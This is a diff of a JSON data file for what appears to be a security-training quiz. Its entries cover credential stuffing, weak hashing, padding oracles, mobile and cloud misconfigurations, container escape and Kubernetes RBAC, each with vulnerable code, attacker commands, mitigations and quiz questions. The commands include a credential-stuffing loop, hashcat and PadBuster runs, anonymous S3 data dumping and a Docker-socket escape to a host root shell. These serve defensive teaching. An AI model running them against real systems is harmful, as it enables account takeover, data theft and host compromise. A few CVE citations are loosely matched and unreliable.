+          "Disable cookies entirely",
+          "Add a CAPTCHA to the login form"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Why is accepting a session ID from a URL parameter risky?",
+        "options": [
+          "It lets an attacker plant a session ID they already know directly via a link",
+          "URLs are always encrypted",
+          "It makes the page load faster",
+          "It has no security implication"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Credential Stuffing & Brute Force",
+    "category": "Auth & Session",
+    "severity": "High",
+    "definition": "Automated attempts to log in using large lists of leaked username/password pairs (credential stuffing) or systematic guessing (brute force), exploiting weak or absent rate limiting.",
+    "theory": "Because many users reuse passwords across sites, attackers replay credentials leaked from one breach against many other login forms. Without rate limiting, account lockouts, or CAPTCHAs, this can be automated at massive scale with tools like Hydra or custom scripts.",
+    "cve": "CVE-2021-26684 context (large-scale credential stuffing campaigns)",
+    "exploit": "1. Obtain a leaked username:password list from a previous breach.\n2. Script automated login attempts against the target's login endpoint.\n3. Without rate limiting, harvest valid accounts where the password was reused.",
+    "example": {
+      "scenario": "A login endpoint has no rate limiting or lockout policy; an attacker feeds a list of 10 million leaked email:password pairs from an unrelated breach into a script, and successfully logs into thousands of accounts where users reused the same password.",
+      "code": "# Attacker script (simplified)\nfor email, password in leaked_credentials_list:\n    r = requests.post('https://app.com/login', json={'email': email, 'password': password})\n    if r.status_code == 200:\n        print(f'Valid: {email}:{password}')\n# No CAPTCHA, no rate limit, no lockout -> millions of attempts succeed unnoticed"
+    },
+    "mitigation": "Rate limiting, account lockout/backoff, CAPTCHA after failures, breached-password detection, multi-factor authentication.",
+    "quizzes": [
+      {
+        "question": "Credential stuffing relies on what common user behavior?",
+        "options": [
+          "Reusing the same password across multiple sites",
+          "Using very long passwords",
+          "Logging out after every session",
+          "Using a password manager"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Which control most directly stops automated mass login attempts?",
+        "options": [
+          "Rate limiting / account lockout after repeated failures",
+          "A longer page load time",
+          "Using a CDN",
+          "Disabling HTTPS"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What additional layer of defense makes stolen/guessed passwords alone insufficient to log in?",
+        "options": [
+          "Multi-factor authentication (MFA)",
+          "A longer username",
+          "A bigger database",
+          "Disabling password resets"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Insecure Password Reset Logic",
+    "category": "Auth & Session",
+    "severity": "High",
+    "definition": "Flaws in the 'forgot password' flow — predictable reset tokens, no expiry, or leaking tokens — allow an attacker to take over another user's account.",
+    "theory": "Password reset is a high-value target because it bypasses the normal login entirely. Common flaws: predictable/sequential tokens, tokens that never expire, tokens leaked via Referer headers or logs, or reset flows that don't invalidate old sessions.",
+    "cve": "CVE-2022-23131 (Zabbix SAML password reset bypass)",
+    "exploit": "1. Trigger a password reset for the victim's account.\n2. If the token is short, sequential, or time-based, attempt to predict/brute-force it.\n3. Use the predicted token to set a new password and take over the account.",
+    "example": {
+      "scenario": "A site generates password reset tokens as a simple incrementing counter instead of a cryptographically random value; an attacker requests a reset for their own account to see the current token value, then simply increments it to guess the token issued for the victim moments later.",
+      "code": "// Vulnerable token generation\nlet resetCounter = 100000;\nfunction generateResetToken() { return (resetCounter++).toString(); } // predictable!\n\n// Attacker requests their own reset, sees token=100042\n// Victim requests a reset moments later -> attacker guesses token=100043"
+    },
+    "mitigation": "Use cryptographically random, single-use, short-lived tokens; invalidate all sessions on password change.",
+    "quizzes": [
+      {
+        "question": "What property must a password reset token have to be secure?",
+        "options": [
+          "Cryptographically random, single-use, and short-lived",
+          "Short and easy to type",
+          "Based on the user's email address",
+          "Sequential for easy debugging"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Why are predictable (e.g. sequential) reset tokens dangerous?",
+        "options": [
+          "An attacker can guess or compute another user's token by observing the pattern",
+          "They expire too quickly",
+          "They are always sent over HTTP",
+          "They cannot be used more than once"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What should happen to existing sessions after a successful password reset?",
+        "options": [
+          "All existing sessions should be invalidated",
+          "Nothing, sessions should remain active",
+          "Only the current session should be extended",
+          "Sessions should be duplicated for backup"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Excessive Data Exposure (API)",
+    "category": "API Security",
+    "severity": "Medium",
+    "definition": "An API returns more data than the client actually needs, relying on the front-end to filter it — exposing sensitive fields to anyone who inspects the raw response.",
+    "theory": "Developers often return a full internal object from the database and let the UI pick which fields to display, assuming users will only see the filtered view. But the raw API response is fully visible via browser dev tools or a proxy, exposing fields like password hashes, internal flags, or other users' data never meant to be public.",
+    "cve": "OWASP API Security Top 10 — API3:2023",
+    "exploit": "1. Open browser dev tools / a proxy like Burp.\n2. Trigger a normal API call (e.g. load a user profile).\n3. Inspect the raw JSON response for fields not shown in the UI (password_hash, internal_notes, ssn).",
+    "example": {
+      "scenario": "A profile API endpoint returns the entire user database row — including the password hash and internal admin notes — and simply relies on the front-end to only display the name and avatar, but anyone inspecting network traffic sees everything.",
+      "code": "// Vulnerable API response (full DB row returned)\n{\n  \"id\": 441, \"name\": \"Het\", \"avatar\": \"...\",\n  \"password_hash\": \"$2b$12$KIXQ...\",\n  \"internal_notes\": \"Flagged for chargeback review\",\n  \"ssn_last4\": \"1234\"\n}\n// UI only renders 'name' and 'avatar', but the full object is visible in dev tools / network tab"
+    },
+    "mitigation": "Explicitly define and return only the fields the client needs (response DTOs/serializers); never rely on the front-end to hide sensitive data.",
+    "quizzes": [
+      {
+        "question": "Excessive data exposure happens because the API relies on what to hide sensitive fields?",
+        "options": [
+          "The front-end UI filtering what it displays",
+          "TLS encryption",
+          "Database indexing",
+          "Rate limiting"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "How can sensitive fields exposed via this flaw be discovered by an attacker?",
+        "options": [
+          "Inspecting the raw API response via browser dev tools or a proxy",
+          "Brute-forcing the password",
+          "Sending malformed packets",
+          "Scanning open ports"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What's the correct fix for excessive data exposure?",
+        "options": [
+          "Define explicit response schemas/DTOs server-side that only include necessary fields",
+          "Encrypt the entire response body",
+          "Compress the JSON response",
+          "Use a faster database"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Unrestricted Resource Consumption (API Rate Limiting)",
+    "category": "API Security",
+    "severity": "High",
+    "definition": "An API lacks limits on request volume, payload size, or resource-intensive operations, letting a single client exhaust server resources or rack up costs.",
+    "theory": "Without limits on requests per minute, response page sizes, or expensive operations (large exports, image resizing, AI inference), a single attacker — or even an inefficient legitimate client — can cause denial of service or runaway cloud billing.",
+    "cve": "OWASP API Security Top 10 — API4:2023",
+    "exploit": "1. Identify an expensive operation exposed via the API (bulk export, image processing, search with no pagination limit).\n2. Send many concurrent requests or request very large payloads/result sets.\n3. Observe degraded performance, errors, or unexpectedly high cloud costs.",
+    "example": {
+      "scenario": "A 'generate PDF report' API endpoint has no limit on date range or concurrent requests; an attacker scripts thousands of concurrent requests for multi-year reports, exhausting server CPU and spiking the company's cloud compute bill.",
+      "code": "// Vulnerable endpoint — no limits on range or concurrency\napp.get('/api/report', requireAuth, async (req, res) => {\n  const report = await generateHeavyPdfReport(req.query.from, req.query.to); // no max range, no rate limit\n  res.send(report);\n});\n\n// Attacker script fires hundreds of concurrent huge-range requests\nfor (let i = 0; i < 500; i++) fetch('/api/report?from=2015-01-01&to=2026-01-01');"
+    },
+    "mitigation": "Enforce rate limits, pagination caps, payload size limits, and timeouts on expensive operations.",
+    "quizzes": [
+      {
+        "question": "What kind of harm does unrestricted resource consumption typically cause?",
+        "options": [
+          "Denial of service or runaway cloud costs from resource exhaustion",
+          "Data corruption in the database",
+          "Permanent account lockout",
+          "TLS certificate expiry"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Which controls help prevent this category of API abuse?",
+        "options": [
+          "Rate limits, pagination caps, and payload size limits",
+          "Longer session tokens",
+          "More descriptive error messages",
+          "Disabling logging"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Why can even a single legitimate-looking client cause harm here?",
+        "options": [
+          "A single client can request an arbitrarily large or expensive operation if no limits are enforced",
+          "Single clients are always malicious",
+          "This only happens with multiple clients, never one",
+          "It requires a botnet to be exploitable at all"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Weak Cryptographic Storage",
+    "category": "Cryptography",
+    "severity": "Critical",
+    "definition": "Sensitive data (passwords, tokens, PII) is stored using outdated, weak, or no encryption/hashing, making it trivial to recover if the storage is breached.",
+    "theory": "Using fast general-purpose hashes (MD5, SHA-1) for passwords, reversible encryption where hashing is appropriate, or storing secrets in plaintext all mean a single database leak instantly compromises all user credentials, since these algorithms are either crackable at scale or trivially reversible.",
+    "cve": "CVE-2012-3499 (Apache mod_status — but widely cited alongside the LinkedIn 2012 SHA-1 password breach)",
+    "exploit": "1. Obtain a leaked database dump.\n2. Identify the hashing algorithm (MD5 hashes are 32 hex chars, unsalted SHA-1 is fast to crack).\n3. Run the hashes through hashcat with rainbow tables / wordlists to recover plaintext passwords at scale.",
+    "example": {
+      "scenario": "A company stores user passwords as unsalted MD5 hashes; after a database breach, an attacker runs the entire dump through hashcat with a known rainbow table and recovers the vast majority of plaintext passwords within hours.",
+      "code": "// Vulnerable password storage\nconst hash = crypto.createHash('md5').update(password).digest('hex'); // weak, fast, unsalted\n\n// Attacker cracking command\n$ hashcat -m 0 -a 0 leaked_hashes.txt rockyou.txt\n# MD5 hashes crack at billions of guesses/sec on a modern GPU"
+    },
+    "mitigation": "Use slow, salted password hashing (bcrypt, scrypt, Argon2); encrypt sensitive data at rest with modern authenticated ciphers (AES-GCM) and proper key management.",
+    "quizzes": [
+      {
+        "question": "Which algorithm is appropriate for securely storing passwords?",
+        "options": [
+          "bcrypt / Argon2 / scrypt",
+          "MD5",
+          "SHA-1",
+          "Base64 encoding"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Why are MD5 and unsalted SHA-1 considered weak for password storage today?",
+        "options": [
+          "They are fast to compute, making large-scale brute-force/rainbow-table cracking feasible on modern hardware",
+          "They are illegal to use",
+          "They produce outputs that are too short to store",
+          "They require internet access to compute"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What is 'salting' in the context of password hashing?",
+        "options": [
+          "Adding a unique random value to each password before hashing, so identical passwords don't produce identical hashes",
+          "Encrypting the password twice",
+          "Storing the password in a separate database",
+          "Using a shorter password"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Padding Oracle Attack",
+    "category": "Cryptography",
+    "severity": "High",
+    "definition": "A server that reveals whether decrypted ciphertext has valid padding (via distinct errors or timing) allows an attacker to decrypt data byte-by-byte without knowing the key.",
+    "theory": "Block ciphers in CBC mode use padding schemes (like PKCS#7). If a server responds differently for 'padding invalid' versus 'padding valid but content wrong', an attacker can manipulate ciphertext bytes and use the oracle's responses to decrypt (or even forge) data without ever recovering the encryption key itself.",
+    "cve": "CVE-2014-3566 (POODLE)",
+    "exploit": "1. Find an endpoint that decrypts an attacker-supplied ciphertext (e.g. an encrypted session cookie or viewstate).\n2. Modify ciphertext bytes and observe whether the server's error response differs for padding failures vs. other failures.\n3. Use tools like PadBuster to automate byte-by-byte decryption using the oracle.",
+    "example": {
+      "scenario": "A web app encrypts a session token using CBC mode and returns a distinct 'invalid padding' error message versus a generic error for other failures; an attacker uses this difference as an oracle to decrypt the entire token without ever knowing the encryption key.",
+      "code": "// Vulnerable error handling — leaks padding validity\ntry {\n  const plaintext = decryptCBC(ciphertext, key);\n} catch (e) {\n  if (e.message === 'invalid padding') return res.status(400).send('Bad padding'); // distinct error!\n  return res.status(400).send('Decryption failed');\n}\n\n// Attacker uses PadBuster, flipping bytes and watching which error comes back\n$ padbuster https://app.com/decrypt <ciphertext> 16 -error 'Bad padding'"
+    },
+    "mitigation": "Use authenticated encryption (AES-GCM) instead of unauthenticated CBC; return identical generic errors regardless of the failure reason.",
+    "quizzes": [
+      {
+        "question": "A padding oracle attack exploits what kind of leak?",
+        "options": [
+          "A distinguishable difference in server response for valid vs. invalid padding",
+          "A leaked source code repository",
+          "A weak password policy",
+          "An open network port"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What modern cipher mode prevents padding oracle attacks by design?",
+        "options": [
+          "Authenticated encryption like AES-GCM",
+          "ECB mode",
+          "Unauthenticated CBC mode",
+          "ROT13"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What server-side practice helps prevent padding oracle attacks even when using CBC?",
+        "options": [
+          "Returning identical, generic error messages regardless of why decryption failed",
+          "Returning very detailed error messages for debugging",
+          "Logging the encryption key on error",
+          "Disabling HTTPS"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Insecure Randomness (Weak PRNG)",
+    "category": "Cryptography",
+    "severity": "High",
+    "definition": "Security-critical values (tokens, session IDs, password reset codes) are generated using a non-cryptographic random number generator, making them predictable.",
+    "theory": "General-purpose PRNGs (like Math.random() in JavaScript or rand() in C) are designed for speed and statistical distribution, not unpredictability — their internal state can often be inferred from observed outputs, letting an attacker predict future 'random' values used for security tokens.",
+    "cve": "CVE-2018-1000620 context (predictable token generation issues)",
+    "exploit": "1. Identify a security token generated from a weak source (Math.random(), time-based seed).\n2. Collect several sample tokens.\n3. Analyze/reproduce the PRNG's internal state to predict future tokens (session IDs, reset codes).",
+    "example": {
+      "scenario": "A password reset feature generates its 6-digit verification code using Math.random() seeded by the current timestamp; an attacker who can narrow down the approximate request time can brute-force or reproduce the exact PRNG output to predict the victim's code.",
+      "code": "// Vulnerable token generation\nfunction generateResetCode() {\n  return Math.floor(Math.random() * 1000000).toString().padStart(6, '0'); // NOT cryptographically secure\n}\n\n// Math.random() is deterministic given the same internal engine state —\n// an attacker can sometimes reconstruct that state from observed outputs"
+    },
+    "mitigation": "Use a cryptographically secure random number generator (crypto.randomBytes in Node, secrets module in Python) for any security-sensitive value.",
+    "quizzes": [
+      {
+        "question": "Why are general-purpose PRNGs like Math.random() unsuitable for security tokens?",
+        "options": [
+          "They are not designed to be unpredictable and their internal state can sometimes be inferred from outputs",
+          "They are too slow to use in production",
+          "They only generate even numbers",
+          "They require a network connection"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Which Node.js API should be used instead of Math.random() for generating secure tokens?",
+        "options": [
+          "crypto.randomBytes",
+          "Date.now()",
+          "Math.floor",
+          "Array.sort"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What kind of values are most at risk from insecure randomness?",
+        "options": [
+          "Session IDs, password reset codes, and other security-critical tokens",
+          "CSS class names",
+          "Image file names",
+          "Log timestamps"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Insecure Data Storage (Mobile)",
+    "category": "Mobile",
+    "severity": "High",
+    "definition": "A mobile app stores sensitive data (tokens, credentials, PII) in an unprotected location on the device, readable by other apps or anyone with physical/root access.",
+    "theory": "Mobile apps that write sensitive data to plaintext files, unencrypted SQLite databases, or insecure shared preferences leave that data exposed to malware with storage permissions, or to anyone who gains physical access to a rooted/jailbroken device.",
+    "cve": "OWASP Mobile Top 10 — M9: Insecure Data Storage",
+    "exploit": "1. Root/jailbreak a test device or use an emulator.\n2. Pull the app's data directory (adb pull /data/data/com.app/).\n3. Inspect SharedPreferences XML files, SQLite DBs, or cache files for plaintext tokens, passwords, or PII.",
+    "example": {
+      "scenario": "A banking app caches the user's auth token and account balance in a plaintext SharedPreferences XML file; anyone with a rooted device (or a forensic extraction tool) can pull the file directly and read the data without ever touching the app's UI.",
+      "code": "// Vulnerable Android code\nSharedPreferences prefs = getSharedPreferences(\"app_prefs\", MODE_PRIVATE);\nprefs.edit().putString(\"auth_token\", token).putString(\"balance\", balance).apply(); // stored in plaintext XML\n\n// Attacker with root access\n$ adb pull /data/data/com.bankapp/shared_prefs/app_prefs.xml\n$ cat app_prefs.xml   # auth_token and balance visible in plaintext"
+    },
+    "mitigation": "Use platform secure storage (Android Keystore / iOS Keychain), encrypt sensitive data at rest, avoid caching sensitive data unnecessarily.",
+    "quizzes": [
+      {
+        "question": "Where should sensitive mobile app data (tokens, credentials) be stored?",
+        "options": [
+          "Platform secure storage like Android Keystore or iOS Keychain",
+          "Plain SharedPreferences/NSUserDefaults",
+          "A world-readable cache file",
+          "The app's log files"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "How can an attacker typically access insecurely stored data on a mobile device?",
+        "options": [
+          "By rooting/jailbreaking the device or using forensic extraction tools to read the app's data directory",
+          "By guessing the app's password remotely",
+          "By scanning open network ports",
+          "By sending a phishing SMS"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What's a good general practice regarding sensitive data and mobile apps?",
+        "options": [
+          "Avoid caching sensitive data on-device unless absolutely necessary, and encrypt it when you do",
+          "Cache as much data as possible for performance",
+          "Store all data in app logs for debugging",
+          "Disable the device's screen lock requirement"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Insecure Mobile WebView Configuration",
+    "category": "Mobile",
+    "severity": "High",
+    "definition": "A mobile app's embedded WebView is configured with overly permissive settings (JavaScript bridges, file access, mixed content), letting malicious web content escalate into native app compromise.",
+    "theory": "WebViews that expose native JavaScript interfaces (addJavascriptInterface on Android) to untrusted web content, or that allow loading arbitrary/mixed-content URLs, let an attacker who controls a loaded page call native app functions directly — potentially reading files, accessing contacts, or executing code.",
+    "cve": "CVE-2012-6636 (Android addJavascriptInterface RCE)",
+    "exploit": "1. Identify an app loading attacker-influenced content in a WebView (e.g. via a deep link or ad network).\n2. If a native JS bridge is exposed, call its methods directly from injected JavaScript.\n3. Use the bridge to access native functionality (read files, get device info, etc.) from purely web-based code.",
+    "example": {
+      "scenario": "An app exposes a native Java object to its WebView via addJavascriptInterface, allowing any JavaScript running inside that WebView — including from a malicious ad or a man-in-the-middle-injected page — to directly call native methods like reading local files.",
+      "code": "// Vulnerable Android code\nwebView.getSettings().setJavaScriptEnabled(true);\nwebView.addJavascriptInterface(new NativeBridge(), \"AndroidBridge\"); // exposed to ALL loaded content\n\n// Malicious JS loaded via a compromised ad network inside the WebView\nAndroidBridge.readFile('/data/data/com.app/shared_prefs/app_prefs.xml');"
+    },
+    "mitigation": "Avoid exposing native JS bridges to untrusted content, validate/restrict URLs the WebView can load, disable file access and mixed content where not needed.",
+    "quizzes": [
+      {
+        "question": "What Android API, if misused, can expose native app functionality to untrusted web content?",
+        "options": [
+          "addJavascriptInterface",
+          "setContentView",
+          "startActivity",
+          "onCreate"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Why is exposing a JS bridge to a WebView risky if the WebView can load arbitrary content?",
+        "options": [
+          "Any JavaScript running in the WebView — including from malicious or compromised content — can call the native bridge methods directly",
+          "It slows down the app",
+          "It only affects iOS, not Android",
+          "It has no security implication if HTTPS is used"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What's a key mitigation for insecure WebView configurations?",
+        "options": [
+          "Restrict which URLs the WebView can load and avoid exposing native bridges to untrusted content",
+          "Always enable JavaScript and file access for compatibility",
+          "Disable HTTPS to simplify debugging",
+          "Increase the WebView's cache size"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Hardcoded Secrets in Mobile Apps",
+    "category": "Mobile",
+    "severity": "Critical",
+    "definition": "API keys, credentials, or signing secrets are embedded directly in a mobile app's compiled code, where they can be extracted by anyone who decompiles the app.",
+    "theory": "Mobile app binaries (APK/IPA) can be trivially decompiled with free tools, so any secret embedded in the code — cloud API keys, backend credentials, encryption keys — is effectively public the moment the app is published, regardless of obfuscation.",
+    "cve": "Widespread issue documented across multiple mobile security research reports (e.g. cloud key leakage studies)",
+    "exploit": "1. Download the target app's APK/IPA.\n2. Decompile it with a tool like jadx or apktool.\n3. Search the decompiled source/strings for API keys, tokens, or credentials (grep for 'key', 'secret', 'AKIA', etc.).\n4. Use the recovered key against the associated cloud service.",
+    "example": {
+      "scenario": "A mobile app embeds its cloud storage provider's full-access API key directly in the app's source code 'for convenience'; a security researcher decompiles the publicly available APK in minutes and finds the key in plaintext, gaining full read/write access to the company's cloud storage bucket.",
+      "code": "// Vulnerable hardcoded secret in app source\npublic static final String CLOUD_API_KEY = \"AKIAIOSFODNN7EXAMPLE\";\n\n// Attacker decompilation steps\n$ apktool d app-release.apk\n$ grep -r \"AKIA\" app-release/sources/\n# -> finds the hardcoded key in plaintext, ready to use against the cloud provider's API"
+    },
+    "mitigation": "Never embed secrets in client code; fetch short-lived tokens from a backend after authentication; use platform secure storage and key rotation.",
+    "quizzes": [
+      {
+        "question": "Why are hardcoded secrets in mobile apps considered effectively public?",
+        "options": [
+          "Mobile app binaries can be easily decompiled, exposing embedded strings and code",
+          "Mobile apps are never distributed publicly",
+          "App stores encrypt all app binaries",
+          "Decompilation requires a court order"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What's the correct architecture to avoid embedding long-lived secrets in a mobile app?",
+        "options": [
+          "Have the app authenticate to a backend, which issues short-lived tokens instead of embedding permanent keys",
+          "Obfuscate the variable name containing the secret",
+          "Store the secret in a comment instead of code",
+          "Encrypt the entire APK file"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Does code obfuscation alone solve the hardcoded secrets problem?",
+        "options": [
+          "No — obfuscation makes analysis harder but determined attackers can still extract embedded secrets",
+          "Yes, obfuscation makes secrets completely unrecoverable",
+          "Yes, but only on iOS apps",
+          "Obfuscation is irrelevant to this vulnerability"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Cloud Storage Misconfiguration (S3 Bucket Exposure)",
+    "category": "Cloud",
+    "severity": "Critical",
+    "definition": "A cloud storage bucket (e.g. AWS S3) is configured with public or overly permissive access, exposing its contents to anyone on the internet.",
+    "theory": "Cloud storage defaults to private, but misconfigurations (setting a bucket policy to public-read, enabling 'list objects' for everyone, or misconfigured ACLs) are extremely common and easy to discover via automated scanning of bucket name patterns.",
+    "cve": "Numerous disclosed breaches (e.g. Capital One 2019, various unsecured S3 buckets)",
+    "exploit": "1. Guess or enumerate likely bucket names (company-backups, company-prod-assets).\n2. Attempt anonymous access: aws s3 ls s3://bucket-name --no-sign-request.\n3. If public, list and download all objects, or even upload malicious content if write access is also misconfigured.",
+    "example": {
+      "scenario": "A company creates an S3 bucket named 'acmecorp-backups' to store database backups and accidentally leaves the bucket policy set to public-read; a researcher running automated bucket-name enumeration tools discovers it and downloads years of customer data backups without any authentication.",
+      "code": "// Vulnerable S3 bucket policy (overly permissive)\n{\n  \"Effect\": \"Allow\", \"Principal\": \"*\",\n  \"Action\": \"s3:GetObject\",\n  \"Resource\": \"arn:aws:s3:::acmecorp-backups/*\"\n}\n\n// Attacker command (no credentials required)\n$ aws s3 ls s3://acmecorp-backups --no-sign-request\n$ aws s3 sync s3://acmecorp-backups ./stolen-data --no-sign-request"
+    },
+    "mitigation": "Default to private buckets, use bucket policies with explicit least-privilege principals, enable access logging and automated public-exposure scanning.",
+    "quizzes": [
+      {
+        "question": "What is the most common root cause of S3 bucket exposure breaches?",
+        "options": [
+          "A misconfigured bucket policy or ACL granting public access",
+          "A zero-day exploit in AWS itself",
+          "Weak TLS encryption",
+          "DNS spoofing"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "How do attackers commonly discover exposed cloud storage buckets?",
+        "options": [
+          "Automated enumeration of likely/guessable bucket name patterns",
+          "Phishing the cloud provider's support staff",
+          "Brute-forcing TLS certificates",
+          "Exploiting browser vulnerabilities"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What's a key preventive control for cloud storage misconfiguration?",
+        "options": [
+          "Default to private access and run automated scans for accidentally public buckets",
+          "Make all buckets public for easier debugging",
+          "Disable access logging to reduce noise",
+          "Use the same bucket for all environments"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Cloud IAM Over-Privilege",
+    "category": "Cloud",
+    "severity": "Critical",
+    "definition": "Cloud identity and access management (IAM) roles or users are granted far broader permissions than they need, so compromising one credential can lead to compromising the entire cloud environment.",
+    "theory": "Following least-privilege is hard at scale, so many organizations grant wildcard permissions (e.g. Action:* or AdministratorAccess) for convenience. If any single over-privileged credential is leaked — via a code repo, SSRF-to-metadata, or a compromised CI pipeline — the attacker inherits all of that excess privilege immediately.",
+    "cve": "Capital One 2019 breach context (over-privileged IAM role exploited via SSRF)",
+    "exploit": "1. Obtain any cloud credential (leaked key, SSRF to instance metadata, compromised CI secret).\n2. Run aws sts get-caller-identity and aws iam list-attached-role-policies to enumerate actual permissions.\n3. If overly broad, pivot to read all S3 buckets, spin up resources, or access other services entirely unrelated to the original credential's purpose.",
+    "example": {
+      "scenario": "A CI/CD pipeline's IAM role — intended only to deploy a specific Lambda function — is granted full AdministratorAccess for convenience; when an attacker compromises a dependency in the build pipeline, they inherit that role's credentials and can access every resource in the entire AWS account, not just the Lambda function.",
+      "code": "// Vulnerable over-privileged IAM policy attached to the CI role\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"*\",\n  \"Resource\": \"*\"\n}\n\n// Attacker enumeration after compromising the CI pipeline\n$ aws sts get-caller-identity\n$ aws s3 ls   # full access to every bucket in the account, far beyond the CI's actual job"
+    },
+    "mitigation": "Apply least-privilege IAM policies scoped to specific resources and actions; use short-lived credentials and regularly audit unused permissions.",
+    "quizzes": [
+      {
+        "question": "What is the core risk of over-privileged IAM roles?",
+        "options": [
+          "Compromising one credential grants access far beyond what that credential's actual job required",
+          "It slows down API calls",
+          "It only affects billing, not security",
+          "It has no impact if MFA is enabled"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What IAM principle should be applied to prevent this issue?",
+        "options": [
+          "Least privilege — scope permissions to exactly what's needed",
+          "Maximum privilege for operational flexibility",
+          "Shared credentials across all services",
+          "No IAM policies at all"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Which real-world breach is commonly cited as resulting from an over-privileged IAM role combined with SSRF?",
+        "options": [
+          "Capital One (2019)",
+          "Log4Shell (2021)",
+          "Heartbleed (2014)",
+          "WannaCry (2017)"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Container Escape",
+    "category": "Cloud",
+    "severity": "Critical",
+    "definition": "An attacker breaks out of a containerized application's isolation boundary to gain access to the underlying host system or other containers.",
+    "theory": "Containers share the host kernel, so misconfigurations (running as root, mounting the Docker socket, excessive capabilities, outdated runtimes with kernel exploits) can let code running inside a container escape its isolation and execute on the host directly, compromising every other workload on that machine.",
+    "cve": "CVE-2019-5736 (runc container escape)",
+    "exploit": "1. Gain code execution inside a container (e.g. via an app vulnerability).\n2. Check for a mounted Docker socket (/var/run/docker.sock) or excessive capabilities (--privileged).\n3. If the socket is mounted, use it to spawn a new privileged container with the host filesystem mounted, achieving host-level access.",
+    "example": {
+      "scenario": "A CI runner container is started with the host's Docker socket mounted inside it 'to allow building images'; an attacker who compromises a build job uses that socket to launch a new privileged container that mounts the entire host filesystem, escaping the container boundary entirely.",
+      "code": "// Vulnerable container launch — mounts the host Docker socket\ndocker run -v /var/run/docker.sock:/var/run/docker.sock ci-runner-image\n\n// Attacker code running inside the compromised container\n$ docker run -v /:/host --privileged -it ubuntu chroot /host bash\n# Now has a root shell on the actual host machine"
+    },
+    "mitigation": "Never mount the Docker socket into containers unnecessarily, avoid --privileged mode, drop unneeded capabilities, run containers as non-root, keep runtimes patched.",
+    "quizzes": [
+      {
+        "question": "What underlying fact about containers makes escape possible?",
+        "options": [
+          "Containers share the host's kernel rather than having full hardware-level isolation",
+          "Containers always run as root by default",
+          "Containers cannot be patched",
+          "Containers have no network access"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Why is mounting the Docker socket into a container especially dangerous?",
+        "options": [
+          "It lets code inside the container control Docker itself, including launching new privileged containers with host access",
+          "It only affects container startup speed",
+          "It is required for all containers to function",
+          "It has no security implications if the container is unprivileged"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Which practice reduces the risk of container escape?",
+        "options": [
+          "Avoiding --privileged mode and dropping unnecessary Linux capabilities",
+          "Always running containers as root for simplicity",
+          "Disabling container image updates",
+          "Sharing the same container across all environments"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Kubernetes RBAC Misconfiguration",
+    "category": "Cloud",
+    "severity": "High",
+    "definition": "Overly permissive Kubernetes Role-Based Access Control (RBAC) bindings let a compromised pod or user account perform cluster-wide actions far beyond its intended scope.",
+    "theory": "Kubernetes RBAC controls what each service account/user can do within the cluster. Common misconfigurations include binding the cluster-admin role to default service accounts, or granting wildcard verbs/resources, letting any compromised pod escalate to control the entire cluster.",
+    "cve": "CVE-2018-1002105 (Kubernetes privilege escalation via API server proxy)",
+    "exploit": "1. Gain code execution inside any pod in the cluster.\n2. Check the pod's mounted service account token permissions (kubectl auth can-i --list).\n3. If overly permissive (e.g. bound to cluster-admin), use the token to create new privileged pods, read secrets cluster-wide, or modify any resource.",
+    "example": {
+      "scenario": "A development team binds the cluster-admin ClusterRole to the default service account for convenience during testing, and this configuration accidentally ships to production; an attacker who compromises any single pod in that namespace inherits full cluster-admin rights over the entire Kubernetes cluster.",
+      "code": "# Vulnerable RBAC binding — default service account given cluster-admin\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: dangerous-binding\nsubjects:\n- kind: ServiceAccount\n  name: default\n  namespace: production\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin   # far too broad\n  apiGroup: rbac.authorization.k8s.io\n\n// Attacker inside any compromised pod in that namespace\n$ kubectl auth can-i '*' '*' --all-namespaces   # returns yes"
+    },
+    "mitigation": "Apply least-privilege RBAC roles scoped to specific namespaces/resources, avoid binding cluster-admin to default service accounts, regularly audit role bindings.",
+    "quizzes": [
+      {
+        "question": "What does Kubernetes RBAC control?",
+        "options": [
